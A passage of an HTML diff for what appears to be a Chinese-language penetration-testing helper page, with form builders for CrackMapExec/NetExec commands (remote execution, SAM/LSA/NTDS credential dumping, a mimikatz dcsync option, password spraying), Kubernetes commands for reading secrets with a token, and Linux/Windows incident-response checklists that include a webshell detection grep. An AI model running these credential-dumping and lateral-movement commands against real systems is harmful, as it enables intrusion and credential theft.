+                                    <select id="cmeActionType" name="cmeActionType" required>
+                                        <option value="">请选择操作</option>
+                                        <option value="execCommand">执行命令</option>
+                                        <option value="enumeration">信息枚举</option>
+                                        <option value="credential">凭据操作</option>
+                                        <option value="bruteforce">暴力破解</option>
+                                    </select>
+                                </div>
+                            
+                                <div class="form-group">
+                                    <label for="cmeProtocol">协议:</label>
+                                    <select id="cmeProtocol" name="cmeProtocol" required>
+                                        <option value="">请选择协议</option>
+                                        <option value="ssh">SSH</option>
+                                        <option value="ldap">LDAP</option>
+                                        <option value="mssql">MSSQL</option>
+                                        <option value="winrm">WinRM</option>
+                                        <option value="smb">SMB</option>
+                                        <option value="rdp">RDP</option>
+                                    </select>
+                                </div>
+                                <div class="form-group">
+                                    <label for="cmeTarget">目标:</label>
+                                    <input type="text" id="cmeTarget" name="cmeTarget" placeholder="192.168.123.10" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="cmeUsername">用户名:</label>
+                                    <input type="text" id="cmeUsername" name="cmeUsername" placeholder="administrator" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="cmePassword">密码:</label>
+                                    <input type="text" id="cmePassword" name="cmePassword" placeholder="password">
+                                </div>
+                                <div class="form-group">
+                                    <label for="cmeHash">Hash:</label>
+                                    <input type="text" id="cmeHash" name="cmeHash" placeholder="LM:NT">
+                                </div>
+                                
+                                <div class="form-group cmeCommandGroup">
+                                    <label for="cmeCommand">命令:</label>
+                                    <input type="text" id="cmeCommand" name="cmeCommand" placeholder="whoami">
+                                </div>
+                                
+                                <div class="form-group cmeEnumGroup" style="display: none;">
+                                    <label for="cmeEnumOptions">枚举选项:</label>
+                                    <select id="cmeEnumOptions" name="cmeEnumOptions">
+                                        <option value="--users">域用户枚举</option>
+                                        <option value="--shares">枚举共享</option>
+                                        <option value="--sessions">枚举会话</option>
+                                        <option value="--disk">枚举磁盘</option>
+                                        <option value="--loggedon-users">枚举登录用户</option>
+                                        <option value="--rid-brute">RID爆破枚举</option>
+                                        <option value="--groups">组用户枚举</option>
+                                        <option value="--local-groups">本地组枚举</option>
+                                        <option value="--pass-pol">域密码策略枚举</option>
+                                        <option value="-M webdav">WebDav查询</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group cmeCredGroup" style="display: none;">
+                                    <label for="cmeCredOptions">凭据选项:</label>
+                                    <select id="cmeCredOptions" name="cmeCredOptions">
+                                        <option value="--sam">抓取SAM</option>
+                                        <option value="--lsa">抓取LSA</option>
+                                        <option value="--ntds">抓取NTDS</option>
+                                        <option value="--ntds vss">抓取NTDS VSS</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group cmeProtocolOptions" style="display: none;">
+                                    <label for="cmeProtocolSpecific">协议特定选项:</label>
+                                    <select id="cmeProtocolSpecific" name="cmeProtocolSpecific">
+                                        <option value="">无特定选项</option>
+                                        <option value="--ssl">使用SSL (WinRM)</option>
+                                        <option value="--kdcHost">KDC主机 (LDAP)</option>
+                                    </select>
+                                </div>
+                                
+                                <button type="submit" id="generateCmeButton">生成命令</button>
+                            </form>
+                            <pre id="cmeOutput" class="command-output" readonly placeholder="生成的命令将显示在这里..."></pre>
+                        </div>
+                        
+                        <!-- NXC Tab -->
+                        <div id="nxcTab" class="tabContent">
+                            <form id="nxcForm">
+                                <div class="form-group">
+                                    <label for="nxcActionType">操作类型:</label>
+                                    <select id="nxcActionType" name="nxcActionType" required>
+                                        <option value="">请选择操作</option>
+                                        <option value="execCommand">执行命令</option>
+                                        <option value="fileTransfer">文件传输</option>
+                                        <option value="dumpCredentials">凭据转储</option>
+                                        <option value="loadModule">加载模块</option>
+                                        <option value="passwordSpray">密码喷洒</option>
+                                        <option value="otherOps">其他操作</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="nxcProtocol">协议:</label>
+                                    <select id="nxcProtocol" name="nxcProtocol" required>
+                                        <option value="">请选择协议</option>
+                                        <option value="smb">SMB</option>
+                                        <option value="wmi">WMI</option>
+                                        <option value="winrm">WinRM</option>
+                                        <option value="ssh">SSH</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="nxcTarget">目标:</label>
+                                    <input type="text" id="nxcTarget" name="nxcTarget" placeholder="10.10.10.10 或 10.10.10.1/24" required>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="nxcUsername">用户名:</label>
+                                    <input type="text" id="nxcUsername" name="nxcUsername" placeholder="administrator" required>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="nxcPassword">密码:</label>
+                                    <input type="text" id="nxcPassword" name="nxcPassword" placeholder="ZXCzxc123">
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="nxcHash">哈希(可选):</label>
+                                    <input type="text" id="nxcHash" name="nxcHash" placeholder="bbd0bd1a2e97067bd08a7b617e6a7e18">
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="nxcDomain">域名(可选):</label>
+                                    <input type="text" id="nxcDomain" name="nxcDomain" placeholder="24team.com">
+                                </div>
+                                
+                                <div class="form-group" id="nxcCommandGroup">
+                                    <label for="nxcCommand">命令:</label>
+                                    <input type="text" id="nxcCommand" name="nxcCommand" placeholder="ipconfig">
+                                </div>
+                                
+                                <div class="form-group nxcTransferGroup" style="display: none;">
+                                    <label for="nxcLocalFile">本地文件路径:</label>
+                                    <input type="text" id="nxcLocalFile" name="nxcLocalFile" placeholder="/root/桌面/666.txt">
+                                </div>
+                                
+                                <div class="form-group nxcTransferGroup" style="display: none;">
+                                    <label for="nxcRemoteFile">远程文件路径:</label>
+                                    <input type="text" id="nxcRemoteFile" name="nxcRemoteFile" placeholder="\\666.txt 或 567.txt">
+                                </div>
+                                
+                                <div class="form-group nxcCredentialGroup" style="display: none;">
+                                    <label for="nxcCredentialType">凭据类型:</label>
+                                    <select id="nxcCredentialType" name="nxcCredentialType">
+                                        <option value="--sam">SAM</option>
+                                        <option value="--lsa">LSA</option>
+                                        <option value="--ntds">NTDS (全部用户)</option>
+                                        <option value="--ntds-user">NTDS (指定用户)</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group nxcUserForNtds" style="display: none;">
+                                    <label for="nxcNtdsUser">NTDS指定用户:</label>
+                                    <input type="text" id="nxcNtdsUser" name="nxcNtdsUser" placeholder="administrator">
+                                </div>
+                                
+                                <div class="form-group nxcModuleGroup" style="display: none;">
+                                    <label for="nxcModuleName">模块名称:</label>
+                                    <select id="nxcModuleName" name="nxcModuleName">
+                                        <option value="lsassy">lsassy</option>
+                                        <option value="nanodump">nanodump</option>
+                                        <option value="mimikatz">mimikatz</option>
+                                        <option value="spooler">spooler</option>
+                                        <option value="webdav">webdav</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group nxcModuleOptions" style="display: none;">
+                                    <label for="nxcModuleOptions">模块参数:</label>
+                                    <input type="text" id="nxcModuleOptions" name="nxcModuleOptions" placeholder='-o COMMAND="lsadump::dcsync /domain:24team.com /user:krbtgt"'>
+                                </div>
+                                
+                                <div class="form-group nxcOtherOpsGroup" style="display: none;">
+                                    <label for="nxcOtherOpsType">操作类型:</label>
+                                    <select id="nxcOtherOpsType" name="nxcOtherOpsType">
+                                        <option value="--shares">查看共享</option>
+                                        <option value="--users">查看用户</option>
+                                        <option value="--continue-on-success">密码爆破(不中断)</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="form-group">
+                                    <label for="nxcCodepage">代码页:</label>
+                                    <input type="text" id="nxcCodepage" name="nxcCodepage" placeholder="gbk" value="gbk">
+                                </div>
+                                
+                                <button type="submit" id="generateNxcButton">生成命令</button>
+                            </form>
+                            <pre id="nxcOutput" class="command-output" readonly placeholder="生成的命令将显示在这里..."></pre>
+                            
+                            <div class="note">
+                                <h3>NXC 使用说明</h3>
+                                <p>1. 选择要执行的操作类型和协议</p>
+                                <p>2. 根据操作类型填写相应的参数</p>
+                                <p>3. 点击生成按钮获取命令</p>
+                                <p>4. 执行命令时请注意设置正确的代码页以支持中文</p>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- K8s模块 -->
+                <section id="k8s" class="section">
+                    <h2>K8s 操作</h2>
+                    
+                    <!-- 添加标签页结构 -->
+                    <div class="tabHeader">
+                        <button class="tabButton active" data-target="k8sOperationsTab">K8s操作</button>
+                        <button class="tabButton" data-target="k8sBasicsTab">K8s基础</button>
+                    </div>
+                    
+                    <!-- K8s操作标签页 -->
+                    <div id="k8sOperationsTab" class="tabContent active">
+                        <!-- K8s 配置 -->
+                        <div class="k8sConfig">
+                            <h3>K8s 配置</h3>
+                            <div class="input-group">
+                                <input type="text" id="k8sToken" placeholder="Token">
+                                <input type="text" id="k8sUrl" placeholder="API URL">
+                                <input type="text" id="k8sPodName" placeholder="Pod名称">
+                                <input type="text" id="k8sNamespace" placeholder="命名空间">
+                                <button id="applyK8sConfig">应用配置</button>
+                            </div>
+                        </div>
+
+                        <!-- K8s 命令 -->
+                        <div class="k8sCommands">
+                            <h3>K8s 命令</h3>
+                            
+                            <!-- 服务账户信息 -->
+                            <div class="command-group">
+                                <h4>🔍 服务账户信息</h4>
+                                <pre><code>kubectl get serviceaccounts test-sa -n <span class="variable">NAMESPACE</span> -o yaml</code></pre>
+                            </div>
+
+                            <!-- Secrets 操作 -->
+                            <div class="command-group">
+                                <h4>🔐 Secrets 操作</h4>
+                                <pre><code>kubectl get secrets -A --insecure-skip-tls-verify -s <span class="variable">URL</span> --token="<span class="variable">TOKEN</span>"</code></pre>
+                            </div>
+
+                            <!-- 权限检查 -->
+                            <div class="command-group">
+                                <h4>🔐 权限检查</h4>
+                                <pre><code>kubectl auth can-i create pod --insecure-skip-tls-verify -s <span class="variable">URL</span> --token="<span class="variable">TOKEN</span>"</code></pre>
+                            </div>
+
+                            <!-- Pod 管理 -->
+                            <div class="command-group">
+                                <h4>📦 Pod 管理</h4>
+                                <pre><code>kubectl get pod -n <span class="variable">NAMESPACE</span> -o wide --insecure-skip-tls-verify -s <span class="variable">URL</span> --token="<span class="variable">TOKEN</span>"</code></pre>
+                            </div>
+
+                            <!-- 节点管理 -->
+                            <div class="command-group">
+                                <h4>🖥️ 节点管理</h4>
+                                <pre><code>kubectl get nodes --show-labels --insecure-skip-tls-verify -s <span class="variable">URL</span> --token="<span class="variable">TOKEN</span>"</code></pre>
+                            </div>
+
+                            <!-- Kubeconfig 操作 -->
+                            <div class="command-group">
+                                <h4>🔑 Kubeconfig 操作</h4>
+                                <pre><code>cat /etc/kubernetes/kubelet.conf</code></pre>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- K8s基础标签页 -->
+                    <div id="k8sBasicsTab" class="tabContent">
+                        <div class="k8sBasicsContainer">
+                            <!-- 1.1 配置查看 -->
+                            <div class="command-group">
+                                <h4>🔍 配置查看</h4>
+                                <pre><code>kubectl config view</code></pre>
+                            </div>
+
+                            <!-- 1.2 其他配置操作 -->
+                            <div class="command-group">
+                                <h4>⚙️ 其他配置操作</h4>
+                                <pre><code># 同时使用多个 kubeconfig 文件并查看合并后的配置
+KUBECONFIG=~/.kube/config:~/.kube/kubconfig2 kubectl config view
+
+# 获取 e2e 用户的密码
+kubectl config view -o jsonpath='{.users[?(@.name == "e2e")].user.password}'
+
+# 显示当前的上下文
+kubectl config current-context
+
+# 设置默认上下文为 my-cluster-name
+kubectl config use-context my-cluster-name
+
+# 向 kubeconf 中增加支持基本认证的新集群
+kubectl config set-credentials kubeuser/foo.kubernetes.com --username=kubeuser --password=kubepassword
+
+# 使用指定的用户名和 namespace 设置上下文
+kubectl config set-context gce --user=cluster-admin --namespace=foo \
+  && kubectl config use-context gce</code></pre>
+                            </div>
+
+                            <!-- 2.1 资源查看 -->
+                            <div class="command-group">
+                                <h4>📊 资源查看</h4>
+                                <pre><code># 列出所有 namespace 中的所有 service
+kubectl get services
+
+# 列出所有 namespace 中的所有 pod
+kubectl get pods --all-namespaces
+
+# 使用详细输出来描述命令
+kubectl describe nodes k8s-node1
+kubectl describe pods calico-node-bfhpx
+
+# 获取节点信息
+kubectl get nodes
+
+# 查看WBE控制台信息
+kubectl -n kubernetes-dashboard get svc
+
+# 查看pods信息
+kubectl get pods -A</code></pre>
+                            </div>
+
+                            <!-- 2.7 终端操作 -->
+                            <div class="command-group">
+                                <h4>💻 终端操作</h4>
+                                <pre><code># 查看所有正在运行的pod
+kubectl get pods -A
+
+# 进入shell（单容器）
+kubectl exec -it nginx-56b8c64cb4-t97vb -- /bin/bash
+
+# 进入shell（多容器）
+kubectl exec -it my-pod --container main-app -- /bin/bash
+
+# 创建并进入自定义pod
+apiVersion: v1
+kind: Pod
+metadata:
+  name: shell-demo
+spec:
+  volumes:
+  - name: shared-data
+    emptyDir: {}
+  containers:
+  - name: nginx
+    image: nginx
+    volumeMounts:
+    - name: shared-data
+      mountPath: /usr/share/nginx/html
+  hostNetwork: true
+  dnsPolicy: Default
+
+# 创建 Pod
+kubectl apply -f shell-demo.yaml
+
+# 检查容器是否运行正常
+kubectl get pod shell-demo
+
+# 获取正在运行容器的 Shell
+kubectl exec -it shell-demo -- /bin/bash
+kubectl exec -it shell-demo -- /bin/sh</code></pre>
+                            </div>
+
+                            <!-- 2.8 命名空间和日志 -->
+                            <div class="command-group">
+                                <h4>📝 命名空间和日志</h4>
+                                <pre><code># 查看命名空间
+kubectl get namespaces
+
+# 查看日志信息
+cat /var/log/messages
+kubectl logs</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- 应急响应模块 -->
+                <section id="incidentResponse" class="section">
+                    <h2>应急响应</h2>
+                    <div class="tabHeader">
+                        <button class="tabButton active" data-target="linuxIncidentTab">Linux</button>
+                        <button class="tabButton" data-target="windowsIncidentTab">Windows</button>
+                    </div>
+
+                    <div id="linuxIncidentTab" class="tabContent active">
+                        <div class="k8sBasicsContainer">
+                            <div class="command-group">
+                                <h4>原则与分析顺序</h4>
+                                <pre><code>原则：先取证后处置；统一时间基准；最小化改动；保留原始输出并计算哈希；围绕时间、账号、进程、文件、IP、域名和持久化项建立时间线。
+
+1. 固化系统时间、主机信息、内存和关键日志。
+2. 确认异常账号、登录来源和初始入侵时间。
+3. 将异常网络连接映射到进程、路径和父进程。
+4. 检查服务、计划任务、启动项、SSH 公钥等持久化机制。
+5. 根据时间窗口排查新增或修改文件。
+6. 关联认证、进程、Web、系统和网络日志，构建事件时间线。
+7. 证据保全后再隔离主机、禁用账号、阻断 IOC 和清除持久化项。</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>基础信息与时间基准</h4>
+                                <pre><code>hostnamectl
+id
+date -Is
+timedatectl
+uptime
+who -b
+uname -a
+cat /etc/os-release
+cat /proc/version
+free -h
+df -hT
+top -b -n 1</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>进程、端口与服务</h4>
+                                <pre><code>ps auxww
+ps -ef --forest
+pstree -ap
+ss -tulpen
+ss -antp
+lsof -nP -iTCP:80
+fuser -v 80/tcp
+ps -p 1234 -o pid,ppid,user,lstart,etime,cmd
+readlink -f /proc/1234/exe
+tr '\0' ' ' < /proc/1234/cmdline; echo
+tr '\0' '\n' < /proc/1234/environ
+ls -l /proc/1234/fd
+systemctl list-units --type=service --state=running
+systemctl --failed
+systemctl status &lt;service&gt;
+systemctl cat &lt;service&gt;</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>用户、权限与登录活动</h4>
+                                <pre><code>who -a
+w
+last -Faiwx
+lastb -Faiwx
+awk -F: '$3 == 0 {print $1}' /etc/passwd
+awk -F: '$2 == "" {print $1}' /etc/shadow
+awk -F: '$7 !~ /(nologin|false)$/ {print $1, $3, $6, $7}' /etc/passwd
+visudo -c
+grep -RhvE '^\s*(#|$)' /etc/sudoers /etc/sudoers.d 2>/dev/null
+find /root /home -type f -path '*/.ssh/authorized_keys' -print -exec ls -l {} \; 2>/dev/null</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>持久化排查</h4>
+                                <pre><code>cat /etc/crontab
+ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly
+cat /etc/anacrontab 2>/dev/null
+crontab -l
+while IFS=: read -r user _; do echo "=== $user ==="; crontab -u "$user" -l 2>/dev/null; done < /etc/passwd
+ls -la /var/spool/cron /var/spool/cron/crontabs 2>/dev/null
+atq
+ls -la /var/spool/at 2>/dev/null
+systemctl list-timers --all
+systemctl list-unit-files --type=service --state=enabled
+find /etc/systemd/system /usr/lib/systemd/system /lib/systemd/system -type f -ls 2>/dev/null
+ls -la /etc/init.d /etc/rc*.d 2>/dev/null
+ls -la /etc/profile /etc/profile.d /etc/bash.bashrc /etc/rc.local 2>/dev/null
+find /root /home -maxdepth 2 -type f \( -name '.bashrc' -o -name '.profile' -o -name '.bash_profile' \) -ls 2>/dev/null
+cat /etc/ld.so.preload 2>/dev/null
+grep -RhvE '^\s*(#|$)' /etc/ssh/sshd_config /etc/ssh/sshd_config.d 2>/dev/null</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>文件与痕迹排查</h4>
+                                <pre><code>find /var/www -type f \( -name '*.php' -o -name '*.jsp' -o -name '*.asp' -o -name '*.aspx' \) -mtime -1 -ls 2>/dev/null
+find /etc /tmp /var/tmp /dev/shm -xdev -type f -ctime -1 -ls 2>/dev/null
+find / -xdev -type f -name '.*' -ls 2>/dev/null
+find / -xdev \( -nouser -o -nogroup \) -ls 2>/dev/null
+find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null
+find /tmp /var/tmp /dev/shm -xdev -type f -ls 2>/dev/null
+file /path/to/suspicious
+stat /path/to/suspicious
+sha256sum /path/to/suspicious
+getcap -r / 2>/dev/null
+lsattr /path/to/suspicious</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>日志分析</h4>
+                                <pre><code># 常见日志：/var/log/auth.log、/var/log/secure、/var/log/syslog、/var/log/messages、/var/log/kern.log、/var/log/cron、/var/log/audit/audit.log、/var/log/apache2/、/var/log/nginx/
+zgrep -hE 'Failed password|Invalid user' /var/log/auth.log* /var/log/secure* 2>/dev/null
+zgrep -hE 'Accepted (password|publickey)' /var/log/auth.log* /var/log/secure* 2>/dev/null
+zgrep -hE 'Failed password|Invalid user' /var/log/auth.log* /var/log/secure* 2>/dev/null | sed -nE 's/.* from ([0-9a-fA-F:.]+) port.*/\1/p' | sort | uniq -c | sort -nr
+journalctl --since '1 hour ago'
+journalctl -u ssh --since '1 hour ago'
+journalctl -u sshd --since '1 hour ago'
+journalctl _PID=1234
+zgrep -hiE 'base64_decode|shell_exec|passthru|cmd=|/bin/(ba)?sh|wget|curl' /var/log/apache2/access.log* /var/log/nginx/access.log* 2>/dev/null
+zgrep -h ' 404 ' /var/log/apache2/access.log* /var/log/nginx/access.log* 2>/dev/null | awk '{print $1}' | sort | uniq -c | sort -nr
+zgrep -h 'CMD' /var/log/cron* 2>/dev/null
+journalctl -u cron --since '24 hours ago'
+journalctl -k --since '24 hours ago' | grep -Ei 'segfault|general protection|oom|taint'
+ausearch -m EXECVE -ts recent
+ausearch -f /etc/shadow</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>网络、防火墙与 Rootkit 初筛</h4>
+                                <pre><code>ip -br addr
+ip route
+ip neigh
+ss -antup
+cat /etc/resolv.conf
+cat /etc/hosts
+iptables-save
+nft list ruleset
+firewall-cmd --list-all-zones 2>/dev/null
+ufw status verbose 2>/dev/null
+ip -details link | grep -B2 -A2 PROMISC
+lsmod
+cat /proc/modules
+cat /proc/cmdline
+journalctl -k | grep -Ei 'module|taint|segfault|general protection'
+cat /proc/sys/kernel/tainted
+chkrootkit
+rkhunter --check</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>结果留存示例</h4>
+                                <pre><code>ss -antup > /mnt/evidence/ss-antup.txt
+ps auxww > /mnt/evidence/ps-auxww.txt
+sha256sum /mnt/evidence/ss-antup.txt /mnt/evidence/ps-auxww.txt > /mnt/evidence/SHA256SUMS</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>常见场景</h4>
+                                <pre><code># 常见场景一：根据可疑进程名定位
+# 找到这个进程的完整 PID 和启动参数
+ps -ef | grep "./la"
+
+# 查看该进程打开的文件和网络连接，确认是否还有其他隐藏连接
+lsof -p [PID]
+
+# 查看该进程当前的工作目录
+ls -la /proc/[PID]/cwd
+
+# 常见场景二：根据端口定位连接关联进程
+# 查看这个连接关联的进程，获取 PID 和程序名
+lsof -i :【port】
+
+# 或
+netstat -antp | grep 【port】
+
+# 如果是 Java 进程，查看该进程的详细启动参数和类路径
+ps -ef | grep [PID]</code></pre>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="windowsIncidentTab" class="tabContent">
+                        <div class="k8sBasicsContainer">
+                            <div class="command-group">
+                                <h4>原则与分析顺序</h4>
+                                <pre><code>原则：先取证后处置；统一时间基准；最小化改动；保留原始输出并计算哈希；围绕时间、账号、进程、文件、IP、域名和持久化项建立时间线。
+
+1. 固化系统时间、主机信息、内存和关键日志。
+2. 确认异常账号、登录来源和初始入侵时间。
+3. 将异常网络连接映射到进程、路径和父进程。
+4. 检查服务、计划任务、启动项、WMI、注册表启动项等持久化机制。
+5. 根据时间窗口排查新增或修改文件。
+6. 关联认证、进程、Web、系统和网络日志，构建事件时间线。
+7. 证据保全后再隔离主机、禁用账号、阻断 IOC 和清除持久化项。</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>基础信息与时间基准</h4>
+                                <pre><code>hostname
+whoami /all
+date /t
+time /t
+tzutil /g
+systeminfo
+wmic qfe list brief
+set
+Get-Date
+Get-TimeZone
+(Get-CimInstance Win32_OperatingSystem).LastBootUpTime
+Get-ComputerInfo
+Get-HotFix</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>进程、服务与端口</h4>
+                                <pre><code>netstat -ano
+netstat -ano | findstr ":80"
+tasklist /fi "PID eq 1234"
+netstat -anob
+tasklist /v
+tasklist /m /fi "PID eq 1234"
+wmic process where processid=1234 get Name,ProcessId,ParentProcessId,ExecutablePath,CommandLine
+sc queryex type= service state= all
+sc qc &lt;ServiceName&gt;
+wevtutil qe System /q:"*[System[(EventID=7045)]]" /rd:true /f:text /c:50
+Get-NetTCPConnection -LocalPort 80 | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess
+Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
+Get-CimInstance Win32_Process | Select-Object Name,ProcessId,ParentProcessId,ExecutablePath,CommandLine,CreationDate
+Get-CimInstance Win32_Service | Select-Object Name,State,StartMode,StartName,PathName</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>用户、权限与登录活动</h4>
+                                <pre><code>query user
+quser
+qwinsta
+net user
+net localgroup administrators
+whoami /groups
+nltest /dsgetdc:%USERDOMAIN%
+reg query "HKLM\SAM\SAM\Domains\Account\Users" /s
+Get-LocalUser | Select-Object Name,Enabled,LastLogon,PasswordLastSet
+Get-LocalGroupMember Administrators</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>持久化排查</h4>
+                                <pre><code>schtasks /query /fo LIST /v
+schtasks /query /tn "\Microsoft\Windows\TaskName" /xml
+dir /a /s "C:\Windows\System32\Tasks"
+dir /a "C:\Windows\Tasks"
+at
+icacls "C:\Windows\System32\Tasks"
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+reg query "HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
+dir /a "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"
+dir /a "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
+Get-ScheduledTask | Where-Object State -ne 'Disabled' | Select-Object TaskPath,TaskName,State
+Get-ScheduledTask | ForEach-Object { [PSCustomObject]@{ Task = "$($_.TaskPath)$($_.TaskName)"; Execute = ($_.Actions.Execute -join '; '); Arguments = ($_.Actions.Arguments -join '; ') } }
+Get-CimInstance -Namespace root/subscription -ClassName __EventFilter
+Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer
+Get-CimInstance -Namespace root/subscription -ClassName ActiveScriptEventConsumer
+Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>文件与目录排查</h4>
+                                <pre><code>forfiles /p "C:\inetpub\wwwroot" /s /m *.php /d -3 /c "cmd /c echo @path @fdate @ftime"
+dir /a:h /s "C:\inetpub\wwwroot"
+where /r "C:\inetpub\wwwroot" *.exe
+certutil -hashfile "C:\path\suspicious.exe" SHA256
+icacls "C:\path"
+dir C:\Users\*\AppData\Roaming /a /s /o-d
+dir C:\Windows\Temp /a /s /o-d
+dir C:\ProgramData /a /s /o-d
+Get-ChildItem 'C:\inetpub\wwwroot' -Recurse -File -Force | Where-Object LastWriteTime -gt (Get-Date).AddDays(-3) | Sort-Object LastWriteTime -Descending | Select-Object LastWriteTime,Length,FullName
+Get-ChildItem C:\Users,C:\ProgramData,C:\Windows\Temp -Recurse -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 100
+Get-FileHash 'C:\path\suspicious.exe' -Algorithm SHA256
+Get-AuthenticodeSignature 'C:\path\suspicious.exe'</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>日志分析</h4>
+                                <pre><code># 重点事件：4624 登录成功、4625 登录失败、4648 显式凭据、4672 特权登录、4688 进程创建、4698/4702 计划任务、4720 创建用户、4728/4732 加组、5140/5145 共享访问、7045 服务安装、4104 PowerShell 脚本块。
+wevtutil qe Security /c:20 /rd:true /f:text
+wevtutil qe Security /q:"*[System[(EventID=4625)]]" /rd:true /f:text /c:50
+wevtutil qe System /c:50 /f:text /rd:true
+wevtutil qe Application /c:50 /f:text /rd:true
+wevtutil epl Security "D:\evidence\Security.evtx"
+wevtutil epl System "D:\evidence\System.evtx"
+wevtutil epl "Microsoft-Windows-PowerShell/Operational" "D:\evidence\PowerShell-Operational.evtx"
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625,4672,4688,4698,4720,4732} -MaxEvents 100
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 50 | Format-List TimeCreated,Id,Message
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 100</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>网络、防火墙与共享</h4>
+                                <pre><code>ipconfig /all
+route print
+arp -a
+ipconfig /displaydns
+netstat -ano
+netsh advfirewall show allprofiles
+netsh advfirewall firewall show rule name=all
+net share
+net session
+net use
+Get-NetTCPConnection
+Get-NetTCPConnection -State Listen
+Get-NetFirewallProfile
+Get-NetFirewallRule -Enabled True
+Get-SmbShare
+Get-SmbSession</code></pre>
+                            </div>
+
+                            <div class="command-group">
+                                <h4>结果留存示例</h4>
+                                <pre><code>netstat -ano > "D:\evidence\netstat.txt"
+tasklist /v > "D:\evidence\tasklist.txt"
+certutil -hashfile "D:\evidence\netstat.txt" SHA256</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+    <script src="scripts.js"></script>
+        </main>
+    </div>
+</body>
+</html>
